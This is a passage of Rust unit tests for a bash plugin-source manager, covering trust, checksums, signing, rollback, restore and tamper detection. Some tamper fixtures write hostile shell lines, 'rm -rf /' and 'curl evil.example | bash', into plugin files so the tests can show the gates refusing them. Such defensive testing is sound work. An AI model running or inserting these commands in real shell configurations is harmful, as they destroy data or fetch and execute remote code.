        assert_eq!(previous.checksum_sha256, v1.checksum_sha256);
        // Same origin keeps trust (§12.4).
        assert!(read_source_registry()[0].trusted);

        let rolled = rollback_source("oh-my-bash").expect("rollback must succeed");
        assert_eq!(rolled.checksum_sha256, v1.checksum_sha256);
        assert!(read_source_registry()[0].previous.is_none());
        let verify = verify_source("oh-my-bash").unwrap();
        assert!(verify.verified, "{verify:?}");

        let _ = fs::remove_dir_all(&temp);
    }

    #[test]
    fn rollback_refuses_when_local_origin_drifted() {
        // §12.4: a local-path origin cannot rebuild the old tree; rollback
        // must fail the checksum and leave the current install intact.
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("rollback-drifted");
        let origin = temp.join("origin");
        let root = temp.join("sources");
        write_omb_fixture(&origin, "v1");
        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
        add_source(local_request(&origin)).unwrap();
        trust_source("oh-my-bash").unwrap();

        write_omb_fixture(&origin, "v2");
        update_source("oh-my-bash", local_request(&origin)).unwrap();
        let err = rollback_source("oh-my-bash").expect_err("rollback must refuse");
        assert!(err.to_string().contains("checksum mismatch"), "{err}");
        // The v2 install is untouched (still verifiable).
        assert!(verify_source("oh-my-bash").unwrap().verified);
        let _ = fs::remove_dir_all(&temp);
    }

    #[test]
    fn update_with_changed_origin_resets_trust() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("update-origin");
        let origin_a = temp.join("origin-a");
        let origin_b = temp.join("origin-b");
        let root = temp.join("sources");
        write_omb_fixture(&origin_a, "a");
        write_omb_fixture(&origin_b, "b");
        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
        add_source(local_request(&origin_a)).unwrap();
        trust_source("oh-my-bash").unwrap();

        let summary = update_source("oh-my-bash", local_request(&origin_b)).unwrap();
        assert_eq!(summary.id, "oh-my-bash");
        let record = &read_source_registry()[0];
        assert!(!record.trusted, "changed origin must reset trust");
        assert_eq!(record.url, origin_b.to_string_lossy());
        let _ = fs::remove_dir_all(&temp);
    }

    #[test]
    fn degraded_source_is_excluded_from_theme_entries() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("degraded");
        let origin = temp.join("origin");
        let root = temp.join("sources");
        write_omb_fixture(&origin, "v1");
        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
        add_source(local_request(&origin)).unwrap();
        trust_source("oh-my-bash").unwrap();
        assert!(!source_theme_entries().is_empty());

        // Offline/degraded: tree disappears (disk cleanup, roaming profile).
        fs::remove_dir_all(root.join("oh-my-bash")).unwrap();
        let statuses = list_sources();
        assert_eq!(statuses[0].state, "degraded");
        assert_eq!(statuses[0].asset_count, None);
        assert!(
            source_theme_entries().is_empty(),
            "degraded sources must not contribute assets"
        );
        let _ = fs::remove_dir_all(&temp);
    }

    #[test]
    fn tree_checksum_is_deterministic_and_ignores_git_dir() {
        let temp = unique_temp_dir("tree-sha");
        let tree_a = temp.join("a");
        let tree_b = temp.join("b");
        write_omb_fixture(&tree_a, "v1");
        write_omb_fixture(&tree_b, "v1");
        let digest_a = tree_sha256(&tree_a).unwrap();
        let digest_b = tree_sha256(&tree_b).unwrap();
        assert_eq!(digest_a, digest_b, "same content must hash identically");

        fs::create_dir_all(tree_a.join(".git")).unwrap();
        fs::write(tree_a.join(".git/HEAD"), "ref: refs/heads/master\n").unwrap();
        assert_eq!(
            tree_sha256(&tree_a).unwrap(),
            digest_a,
            ".git must not affect the tree checksum"
        );

        fs::write(tree_b.join("extra.txt"), "x").unwrap();
        assert_ne!(
            tree_sha256(&tree_b).unwrap(),
            digest_a,
            "content changes must change the checksum"
        );
        let _ = fs::remove_dir_all(&temp);
    }

    #[test]
    fn native_override_prefix_is_stripped() {
        assert_eq!(strip_native_override("native:agnoster"), "agnoster");
        assert_eq!(strip_native_override("agnoster"), "agnoster");
    }

    #[test]
    fn duplicate_add_is_rejected() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("dup");
        let origin = temp.join("origin");
        let root = temp.join("sources");
        write_omb_fixture(&origin, "v1");
        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
        add_source(local_request(&origin)).unwrap();
        let err = add_source(local_request(&origin)).expect_err("duplicate must fail");
        assert!(err.to_string().contains("already registered"), "{err}");
        let _ = fs::remove_dir_all(&temp);
    }

    /// The declarative pipeline's answer to "already registered" (1.3.1):
    /// [`install_or_adopt`] adopts the existing install — by recorded
    /// origin, and by the identity a differently-spelled origin derives —
    /// so `niu plugin add <target>` on an installed source declares it
    /// instead of dead-ending on the imperative refusal.
    #[test]
    fn install_or_adopt_adopts_a_registered_identity() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("adopt");
        let origin = temp.join("origin");
        let root = temp.join("sources");
        write_omb_fixture(&origin, "v1");
        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
        add_source(local_request(&origin)).unwrap();

        // Same request again: adopted, no second fetch, registry unchanged.
        let (record, adopted) = install_or_adopt(local_request(&origin)).unwrap();
        assert!(adopted, "registered identity must adopt");
        assert_eq!(record.id, "oh-my-bash");
        assert_eq!(read_source_registry().len(), 1);

        // A different spelling of the same tree (separator style) derives
        // the same id after fetch and adopts instead of colliding.
        let alt = origin.to_string_lossy().replace('\\', "/");
        let request = SourceInstallRequest {
            origin: alt,
            ..local_request(&origin)
        };
        let (record, adopted) = install_or_adopt(request).unwrap();
        assert!(adopted, "alternate spelling must adopt, not re-install");
        assert_eq!(record.id, "oh-my-bash");
        assert_eq!(read_source_registry().len(), 1, "no second tree promoted");
        let _ = fs::remove_dir_all(&temp);
    }

    /// Uninstall drops the spec declaration naming the source (1.3.1): a
    /// leftover entry would have the next sync resurrect the source — the
    /// wizard's undo receipts name this verb, so it must be complete.
    #[test]
    fn remove_source_drops_the_spec_declaration() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("remove-spec");
        let origin = temp.join("origin");
        let root = temp.join("sources");
        write_omb_fixture(&origin, "v1");
        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
        let _spec = EnvVarGuard::set("NIU_PLUGIN_SPEC", &temp.join("plugins.toml"));
        add_source(local_request(&origin)).unwrap();
        use crate::plugins::spec;
        spec::save_spec(&spec::PluginSpec {
            schema: None,
            sources: vec![spec::SpecSource {
                target: origin.to_string_lossy().into_owned(),
                id: Some("oh-my-bash".to_string()),
                kind: None,
                ref_name: None,
                theme: None,
                enable: vec!["git".to_string()],
            }],
        })
        .unwrap();

        remove_source("oh-my-bash").expect("remove");
        let spec = spec::load_spec().unwrap().expect("spec present");
        assert!(spec.sources.is_empty(), "{:?}", spec.sources);
        assert!(read_source_registry().is_empty());
        let _ = fs::remove_dir_all(&temp);
    }

    #[test]
    fn unknown_origin_without_manager_layout_fails_with_hint() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("unknown-layout");
        let origin = temp.join("origin");
        let root = temp.join("sources");
        fs::create_dir_all(&origin).unwrap();
        fs::write(origin.join("random.txt"), "not a manager\n").unwrap();
        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
        let err = add_source(local_request(&origin)).expect_err("detect must fail");
        assert!(
            err.to_string().contains("no supported plugin manager"),
            "{err}"
        );
        assert!(err.to_string().contains("oh-my-bash"), "{err}");
        let _ = fs::remove_dir_all(&temp);
    }
    #[test]
    fn bash_it_adapter_detects_lists_and_loads_through_enabled_dir() {
        let temp = unique_temp_dir("bash-it-adapter");
        write_bash_it_fixture(&temp, "v1");
        let adapter = adapter_for("bash-it").unwrap();
        assert!(adapter.detect(&temp));
        assert!(!adapter_for("oh-my-bash").unwrap().detect(&temp));
        assert!(!adapter_for("bash-completion").unwrap().detect(&temp));

        let assets = adapter.list_assets(&temp);
        let names: Vec<(String, String)> = assets
            .iter()
            .map(|a| (a.kind.as_str().to_string(), a.name.clone()))
            .collect();
        assert!(names.contains(&("alias".into(), "apt".into())), "{names:?}");
        assert!(
            names.contains(&("plugin".into(), "base".into())),
            "{names:?}"
        );
        assert!(
            names.contains(&("completion".into(), "docker".into())),
            "{names:?}"
        );
        assert!(
            names.contains(&("theme".into(), "demox".into())),
            "{names:?}"
        );

        // Loader snippet keeps bash-it's own path: BASH_IT + guarded source
        // of bash_it.sh, and no forced theme.
        let record = SourceRecord {
            id: "bash-it".to_string(),
            adapter: "bash-it".to_string(),
            url: "unused".to_string(),
            ref_name: LOCAL_ORIGIN_REF.to_string(),
            version: "unknown".to_string(),
            path: temp.clone(),
            trusted: true,
            license: "MIT".to_string(),
            checksum_sha256: "0".to_string(),
            installed_at: String::new(),
            commit_sha: None,
            trust_policy: TrustPolicy::default(),
            signature: None,
            previous: None,
            spec_enabled: None,
            spec_theme: None,
            first_fetch_verified: true,
        };
        let snippet = adapter.loader_snippet(&record);
        // Unified loader template (§14.6.2): the guard carries the literal
        // path; the root var is assigned inside the guard.
        assert!(
            snippet.contains(
                "if [ -f \"${NIU_PLUGIN_SOURCES_ROOT:-$HOME/.niubash/sources}/bash-it/bash_it.sh\" ]"
            ),
            "{snippet}"
        );
        assert!(!snippet.contains("BASH_IT_THEME"), "{snippet}");

        // Selection model: enabled/ directory + BASH_IT_THEME.
        assert_eq!(
            adapter.selection_model(),
            SelectionModel::EnabledDir {
                theme_var: "BASH_IT_THEME",
            }
        );
        let _ = fs::remove_dir_all(&temp);
    }

    #[test]
    fn bash_completion_adapter_detects_and_activates_whole_source() {
        let temp = unique_temp_dir("bash-completion-adapter");
        write_bash_completion_fixture(&temp);
        let adapter = adapter_for("bash-completion").unwrap();
        assert!(adapter.detect(&temp));
        assert!(!adapter_for("oh-my-bash").unwrap().detect(&temp));
        assert_eq!(adapter.license(), "GPL-2.0-or-later");
        let assets = adapter.list_assets(&temp);
        let names: Vec<(String, String)> = assets
            .iter()
            .map(|a| (a.kind.as_str().to_string(), a.name.clone()))
            .collect();
        assert!(
            names.contains(&("completion".into(), "git".into())),
            "{names:?}"
        );

        let record = SourceRecord {
            id: "bash-completion".to_string(),
            adapter: "bash-completion".to_string(),
            url: "unused".to_string(),
            ref_name: LOCAL_ORIGIN_REF.to_string(),
            version: "unknown".to_string(),
            path: temp.clone(),
            trusted: true,
            license: "GPL-2.0-or-later".to_string(),
            checksum_sha256: "0".to_string(),
            installed_at: String::new(),
            commit_sha: None,
            trust_policy: TrustPolicy::default(),
            signature: None,
            previous: None,
            spec_enabled: None,
            spec_theme: None,
            first_fetch_verified: true,
        };
        let snippet = adapter.loader_snippet(&record);
        assert!(snippet.contains("if [ -f "), "{snippet}");
        assert!(snippet.contains("/bash_completion\" ]"), "{snippet}");
        assert!(
            snippet.contains("native completions stay as fallback"),
            "{snippet}"
        );
        assert_eq!(adapter.selection_model(), SelectionModel::WholeSource);
        let _ = fs::remove_dir_all(&temp);
    }

    #[test]
    fn trust_refuses_tampered_tree_and_reports_checksums() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("trust-tamper");
        let origin = temp.join("origin");
        let root = temp.join("sources");
        write_omb_fixture(&origin, "v1");
        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
        add_source(local_request(&origin)).unwrap();

        // Tamper before trusting: the execution gate must refuse.
        fs::write(
            root.join("oh-my-bash/plugins/git/git.plugin.sh"),
            "alias evil='rm -rf /'\n",
        )
        .unwrap();
        let err = trust_source("oh-my-bash").expect_err("tampered tree must refuse trust");
        assert!(err.to_string().contains("checksum mismatch"), "{err}");
        assert!(!read_source_registry()[0].trusted);
        assert!(source_theme_entries().is_empty());

        // Restore the pristine tree by hand, then trust works.
        fs::write(
            root.join("oh-my-bash/plugins/git/git.plugin.sh"),
            "# marker=v1\nalias gg='git status'\n",
        )
        .unwrap();
        assert!(trust_source("oh-my-bash").unwrap().trusted);
        let _ = fs::remove_dir_all(&temp);
    }

    #[test]
    fn github_shorthand_expands_only_for_owner_repo() {
        assert_eq!(
            normalize_origin("ohmybash/oh-my-bash"),
            "https://github.com/ohmybash/oh-my-bash.git"
        );
        // URLs, paths, and multi-segment targets pass through.
        assert_eq!(
            normalize_origin("https://example.com/x.git"),
            "https://example.com/x.git"
        );
        assert_eq!(normalize_origin("./local"), "./local");
        assert_eq!(
            normalize_origin("git@github.com:o/r.git"),
            "git@github.com:o/r.git"
        );
        assert_eq!(normalize_origin("a/b/c"), "a/b/c");
        // An existing directory wins over the shorthand reading.
        let temp = unique_temp_dir("shorthand-dir");
        let dir = temp.join("owner");
        fs::create_dir_all(dir.join("repo")).unwrap();
        assert_eq!(
            normalize_origin(&dir.join("repo").to_string_lossy()),
            dir.join("repo").to_string_lossy().into_owned()
        );
        let _ = fs::remove_dir_all(&temp);
    }

    #[test]
    fn sign_source_upgrades_policy_and_update_re_gates() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("sign-update");
        let repo = temp.join("omb-repo");
        let root = temp.join("sources");
        write_omb_fixture(&repo, "v1");
        let git = |args: &[&str]| {
            let status = Command::new("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .status()
                .expect("git must be available");
            assert!(status.success(), "git {args:?} failed");
        };
        git(&["init", "-q"]);
        git(&["checkout", "-q", "-b", "v1"]);
        git(&["add", "-A"]);
        git(&[
            "-c",
            "user.email=t@example.com",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "v1",
        ]);
        git(&["checkout", "-q", "-b", "v2"]);
        write_omb_fixture(&repo, "v2");
        git(&["add", "-A"]);
        git(&[
            "-c",
            "user.email=t@example.com",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "v2",
        ]);

        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
        let request = |git_ref: &str| SourceInstallRequest {
            adapter: None,
            origin: repo.to_string_lossy().into_owned(),
            ref_name: Some(git_ref.to_string()),
            commit: None,
            expected_checksum: None,
            id: None,
            entry: None,
            fetch_budget: None,
            credential_guard: false,
        };
        let v1 = add_source(request("v1")).unwrap();
        assert!(v1.commit_sha.is_some(), "git installs pin the commit");

        // Local signature tier: sign implies trust.
        let signed = sign_source("oh-my-bash").unwrap();
        assert!(signed.trusted);
        assert_eq!(signed.trust_policy, TrustPolicy::LocalSign);
        assert!(signed.signature.is_some(), "signature recorded");
        let verify = verify_source("oh-my-bash").unwrap();
        assert!(verify.verified, "{verify:?}");
        assert_eq!(verify.signature_ok, Some(true), "{verify:?}");

        // Any changed tree re-enters the execution gate until re-signed.
        update_source("oh-my-bash", request("v2")).unwrap();
        let record = &read_source_registry()[0];
        assert!(!record.trusted, "signed sources re-gate on update");
        let verify = verify_source("oh-my-bash").unwrap();
        assert_eq!(verify.signature_ok, Some(false), "{verify:?}");
        assert!(
            source_theme_entries().is_empty(),
            "re-gated sources contribute nothing"
        );

        // Re-signing the reviewed v2 tree restores trust.
        sign_source("oh-my-bash").unwrap();
        assert!(read_source_registry()[0].trusted);
        let _ = fs::remove_dir_all(&temp);
    }

    #[test]
    fn restore_source_rebuilds_the_pinned_commit() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("restore-pin");
        let repo = temp.join("omb-repo");
        let root = temp.join("sources");
        write_omb_fixture(&repo, "v1");
        let git = |args: &[&str]| {
            let status = Command::new("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .status()
                .expect("git must be available");
            assert!(status.success(), "git {args:?} failed");
        };
        git(&["init", "-q"]);
        git(&["checkout", "-q", "-b", "v1"]);
        git(&["add", "-A"]);
        git(&[
            "-c",
            "user.email=t@example.com",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "v1",
        ]);
        git(&["checkout", "-q", "-b", "v2"]);
        write_omb_fixture(&repo, "v2");
        git(&["add", "-A"]);
        git(&[
            "-c",
            "user.email=t@example.com",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "v2",
        ]);

        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
        let request = |git_ref: &str| SourceInstallRequest {
            adapter: None,
            origin: repo.to_string_lossy().into_owned(),
            ref_name: Some(git_ref.to_string()),
            commit: None,
            expected_checksum: None,
            id: None,
            entry: None,
            fetch_budget: None,
            credential_guard: false,
        };
        let v1 = add_source(request("v1")).unwrap();
        trust_source("oh-my-bash").unwrap();
        let summary = update_source("oh-my-bash", request("v2")).unwrap();

        // `restore` is lockfile repair, not rollback (lazy.nvim :Lazy
        // restore): it rebuilds the *currently locked* state — here v2 —
        // from the pinned commit. Tamper first so repair is observable.
        fs::write(
            root.join("oh-my-bash/themes/agnoster/agnoster.theme.sh"),
            "PS1='tampered'\n",
        )
        .unwrap();
        assert!(!verify_source("oh-my-bash").unwrap().verified);

        let outcome = restore_source("oh-my-bash").expect("restore must succeed");
        assert_eq!(outcome.outcome, "restored");
        let record = &read_source_registry()[0];
        assert!(record.trusted, "same-lock restore keeps trust");
        let verify = verify_source("oh-my-bash").unwrap();
        assert!(verify.verified, "{verify:?}");
        assert_eq!(record.checksum_sha256, summary.checksum_sha256);
        assert!(
            record.commit_sha.is_some(),
            "restored record keeps the commit pin"
        );
        assert_ne!(
            record.checksum_sha256, v1.checksum_sha256,
            "restore repairs the lock (v2), it does not roll back to v1"
        );
        // Rebuilding a degraded (deleted) tree works the same way.
        fs::remove_dir_all(root.join("oh-my-bash")).unwrap();
        restore_source("oh-my-bash").expect("degraded restore must succeed");
        assert!(verify_source("oh-my-bash").unwrap().verified);

        // Local snapshots have no upstream to restore from.
        let local_temp = unique_temp_dir("restore-local");
        let local_origin = local_temp.join("origin");
        let local_root = local_temp.join("sources");
        write_omb_fixture(&local_origin, "v1");
        let _local_guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &local_root);
        add_source(local_request(&local_origin)).unwrap();
        let err = restore_source("oh-my-bash").expect_err("local snapshot restore must fail");
        assert!(
            err.to_string().contains("local directory snapshot"),
            "{err}"
        );
        let _ = fs::remove_dir_all(&temp);
        let _ = fs::remove_dir_all(&local_temp);
    }

    #[test]
    fn clean_reports_orphans_and_deletes_only_on_the_flag() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("clean");
        let root = temp.join("sources");
        let origin = temp.join("origin");
        write_omb_fixture(&origin, "v1");
        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);

        // niubash#299: a staging leftover goes on a plain clean; EVERY
        // directory no registry record claims (manager-shaped or not) is
        // LISTED as an orphan — nothing but staging is deleted until
        // `--orphans` confirms.
        add_source(local_request(&origin)).unwrap();
        let orphan = root.join("orphan-omb");
        write_omb_fixture(&orphan, "stale");
        fs::create_dir_all(root.join(".staging-123-456")).unwrap();
        fs::create_dir_all(root.join("my-notes")).unwrap();
        fs::write(root.join("my-notes/keep.txt"), "user data\n").unwrap();

        let report = clean_sources(false);
        let rows: Vec<(&str, &str)> = report
            .iter()
            .map(|row| (row.id.as_str(), row.outcome.as_str()))
            .collect();
        assert!(rows.contains(&(".staging-123-456", "removed")), "{rows:?}");
        assert!(rows.contains(&("orphan-omb", "orphan")), "{rows:?}");
        assert!(rows.contains(&("my-notes", "orphan")), "{rows:?}");
        assert!(
            root.join("orphan-omb").is_dir(),
            "plain clean must not delete orphans"
        );
        assert!(
            root.join("my-notes/keep.txt").is_file(),
            "plain clean must not delete unregistered user data"
        );
        assert!(root.join("oh-my-bash").is_dir(), "registered tree stays");

        // `--orphans` is the explicit confirm: the listed orphans go.
        let removed = clean_sources(true);
        let ids: Vec<(&str, &str)> = removed
            .iter()
            .map(|row| (row.id.as_str(), row.outcome.as_str()))
            .collect();
        assert!(ids.contains(&("orphan-omb", "removed")), "{ids:?}");
        assert!(ids.contains(&("my-notes", "removed")), "{ids:?}");
        assert!(!root.join("orphan-omb").exists());
        assert!(!root.join("my-notes").exists());
        assert!(root.join("oh-my-bash").is_dir(), "registered tree stays");
        let _ = fs::remove_dir_all(&temp);
    }

    /// A hand-written registry carrying one healthy pinned record plus one
    /// line that fails to parse (niubash#178's shape: a hand edit or a
    /// crashed write left garbage in `registry.toml`).
    fn corrupt_registry_text(pinned: &SourceRecord) -> String {
        let mut registry = SourceRegistryToml {
            schema: Some(SOURCE_REGISTRY_SCHEMA.to_string()),
            sources: vec![pinned.clone()],
        };
        let mut text =
            toml::to_string_pretty(&mut registry).expect("healthy records must serialize");
        text.push_str("\n[[sources]]\nid = \"broken-entry\"\nthis line is not toml =\n");
        text
    }

    /// niubash#178: one unparsable line in `registry.toml` must never cost
    /// the user their persisted pins. The corrupt file is warned about
    /// exactly once, snapshotted byte-for-byte to a `.corrupt` sidecar, and
    /// NEVER rewritten by a registry write — only a human repair (fixing or
    /// removing the file) re-enables writes.
    #[test]
    fn corrupt_registry_is_preserved_and_never_silently_rewritten() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("corrupt-registry");
        let root = temp.join("sources");
        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);

        let pinned = SourceRecord {
            id: "oh-my-bash".to_string(),
            adapter: "oh-my-bash".to_string(),
            url: "https://github.com/ohmybash/oh-my-bash.git".to_string(),
            ref_name: "HEAD".to_string(),
            version: "git-abc123".to_string(),
            path: root.join("oh-my-bash"),
            trusted: true,
            license: "MIT".to_string(),
            checksum_sha256: "cafe1234".to_string(),
            installed_at: "1700000000".to_string(),
            commit_sha: Some("abc123def456".to_string()),
            trust_policy: TrustPolicy::Checksum,
            signature: None,
            previous: None,
            spec_enabled: Some(vec!["git".to_string()]),
            spec_theme: Some("agnoster".to_string()),
            first_fetch_verified: true,
        };
        let path = root.join("registry.toml");
        fs::create_dir_all(&root).unwrap();
        let corrupt_text = corrupt_registry_text(&pinned);
        fs::write(&path, &corrupt_text).unwrap();

        // The corruption is surfaced, not swallowed.
        let corruption = registry_corruption().expect("the corrupt file must be reported");
        assert!(
            corruption.raw_text.contains("broken-entry"),
            "{:?}",
            corruption
        );
        assert!(
            corruption.raw_text.contains("abc123def456"),
            "the pin rides along"
        );

        // Exactly one warning per distinct content: the first read/preserve
        // warns, the second is silent (same process, same bytes).
        assert!(
            preserve_and_warn_corrupt_registry(&corruption),
            "first warn"
        );
        assert!(
            !preserve_and_warn_corrupt_registry(&corruption),
            "the same content never warns twice"
        );

        // The sidecar snapshot carries the original bytes verbatim —
        // the pin and trust state survive any later repair.
        let sidecar = root.join("registry.toml.corrupt");
        assert_eq!(
            fs::read_to_string(&sidecar).unwrap(),
            corrupt_text,
            "sidecar must be byte-for-byte"
        );

        // THE regression: a successful sync path's registry write must be
        // refused — the file, corrupt line and pin included, survives
        // byte-for-byte.
        let err = write_source_registry(std::slice::from_ref(&pinned))
            .expect_err("rewriting a corrupt registry must be refused");
        assert!(err.to_string().contains("refusing to rewrite"), "{err}");
        assert_eq!(
            fs::read_to_string(&path).unwrap(),
            corrupt_text,
            "the corrupt file (broken line + pin) must survive untouched"
        );

        // Consent = a human repairs the file. Writes resume on a parseable
        // registry, and the healthy record round-trips.
        let mut registry = SourceRegistryToml {
            schema: Some(SOURCE_REGISTRY_SCHEMA.to_string()),
            sources: vec![pinned.clone()],
        };
        fs::write(&path, toml::to_string_pretty(&mut registry).unwrap()).unwrap();
        assert!(registry_corruption().is_none(), "repaired file parses");
        write_source_registry(std::slice::from_ref(&pinned))
            .expect("post-repair write must succeed");
        let records = read_source_registry();
        assert_eq!(records.len(), 1);
        assert_eq!(records[0].commit_sha.as_deref(), Some("abc123def456"));
        assert!(records[0].trusted, "the pin/trust state round-trips");

        let _ = fs::remove_dir_all(&temp);
    }

    // ── niubash#297: the runtime tamper gate ────────────────────────────────

    /// THE #297 regression: a trusted tree modified AFTER `trust` must read
    /// as degraded with the drift reason (not `ready` with a stale
    /// checksum) and stop contributing assets. The repair path is a git
    /// origin's `restore`, whose wording must be honest about REBUILDING
    /// from the pin (not claiming the old tree "matches").
    #[test]
    fn drifted_trusted_tree_is_degraded_and_restore_repairs_it() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("drift-list");
        let repo = temp.join("omb-repo");
        let root = temp.join("sources");
        write_omb_fixture(&repo, "v1");
        let git = |args: &[&str]| {
            let status = Command::new("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .status()
                .expect("git must be available");
            assert!(status.success(), "git {args:?} failed");
        };
        git(&["init", "-q"]);
        git(&["checkout", "-q", "-b", "v1"]);
        git(&["add", "-A"]);
        git(&[
            "-c",
            "user.email=t@example.com",
            "-c",
            "user.name=t",
            "commit",
            "-q",
            "-m",
            "v1",
        ]);
        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
        add_source(SourceInstallRequest {
            ref_name: Some("v1".to_string()),
            ..local_request(&repo)
        })
        .unwrap();
        trust_source("oh-my-bash").unwrap();

        // Healthy: ready, no drift.
        let statuses = list_sources();
        assert_eq!(statuses[0].state, "ready");
        assert!(!statuses[0].degraded);
        assert!(statuses[0].degraded_reason.is_none());

        // Tamper the trusted tree: the runtime gate must see it —
        // degraded=true with the drift reason, no assets.
        fs::write(
            root.join("oh-my-bash/plugins/git/git.plugin.sh"),
            "alias evil='curl evil.example | bash'\n",
        )
        .unwrap();
        let statuses = list_sources();
        assert_eq!(statuses[0].state, "degraded", "{:?}", statuses[0]);
        assert!(statuses[0].degraded, "{:?}", statuses[0]);
        assert_eq!(
            statuses[0].degraded_reason.as_deref(),
            Some(DEGRADED_DRIFTED),
            "{:?}",
            statuses[0]
        );
        assert_eq!(statuses[0].asset_count, None);
        // (The drift LEDGER is written by `niu plugin sync` — covered in the
        // sync-side test; `list` computes the state, it does not write.)
        assert!(
            source_theme_entries().is_empty(),
            "a drifted tree must not contribute assets"
        );

        // Restore from the git origin: honest rebuild wording, healthy
        // again.
        let outcome = restore_source("oh-my-bash").expect("restore must succeed");
        assert!(
            outcome.detail.contains("rebuilt from the lockfile pin"),
            "restore wording must be honest about rebuilding: {}",
            outcome.detail
        );
        assert!(!outcome.detail.contains("tree matches"), "{:?}", outcome);
        let statuses = list_sources();
        assert_eq!(statuses[0].state, "ready");
        assert!(!statuses[0].degraded);
        let _ = fs::remove_dir_all(&temp);
    }

    /// The drift ledger round-trip: record is idempotent, clear drops only
    /// the named id, and a cleared-last id removes the file entirely (no
    /// orphan state litter under the sources root).
    #[test]
    fn drift_ledger_records_idempotently_and_clears_selectively() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("drift-ledger");
        let root = temp.join("sources");
        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);

        record_drifted_source("a").unwrap();
        record_drifted_source("a").unwrap();
        record_drifted_source("b").unwrap();
        assert_eq!(drifted_source_ids(), vec!["a", "b"]);
        assert!(drifted_state_path().is_file());

        clear_drifted_source("a").unwrap();
        assert_eq!(drifted_source_ids(), vec!["b"]);
        clear_drifted_source("not-recorded").unwrap();
        assert_eq!(drifted_source_ids(), vec!["b"]);
        clear_drifted_source("b").unwrap();
        assert!(drifted_source_ids().is_empty());
        assert!(
            !drifted_state_path().exists(),
            "an empty ledger must not linger"
        );
        let _ = fs::remove_dir_all(&temp);
    }

    /// The EnabledDir transparency is exactly that, and no more: `niu
    /// plugin enable` writes byte-faithful copies of pinned files into
    /// `enabled/` and the pin check stays green; a file injected there with
    /// content that exists nowhere in the pinned tree trips it (the
    /// enabled/ tree is what bash-it executes at startup, so it can never
    /// be a blind spot).
    #[test]
    fn bash_it_enabled_copies_are_transparent_but_injections_trip() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("enabled-transparency");
        let origin = temp.join("bash-it");
        let root = temp.join("sources");
        write_bash_it_fixture(&origin, "v1");
        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
        add_source(local_request(&origin)).unwrap();
        trust_source("bash-it").unwrap();
        let installed = root.join("bash-it");

        // What `niu plugin enable base` does: copy available/ into enabled/.
        fs::create_dir_all(installed.join("enabled")).unwrap();
        fs::copy(
            installed.join("plugins/available/base.plugin.bash"),
            installed.join("enabled/350---base.plugin.bash"),
        )
        .unwrap();
        let ok = verify_source("bash-it").expect("verify must run");
        assert!(ok.verified, "{ok:?}");

        // An injection with unpinned content is NOT transparent.
        fs::write(
            installed.join("enabled/999---evil.plugin.bash"),
            "curl evil.example | bash\n",
        )
        .unwrap();
        let bad = verify_source("bash-it").expect("verify must run");
        assert!(!bad.verified, "{bad:?}");
        // And trust refuses it too (the runtime gate's authority).
        assert!(trust_source("bash-it").is_err());

        // Removing the injection heals the check without touching the pin.
        fs::remove_file(installed.join("enabled/999---evil.plugin.bash")).unwrap();
        assert!(verify_source("bash-it").unwrap().verified);
        let _ = fs::remove_dir_all(&temp);
    }

    // ── niubash#298: first-fetch integrity recording ────────────────────────

    /// A non-catalog install without a pin records `first_fetch_verified =
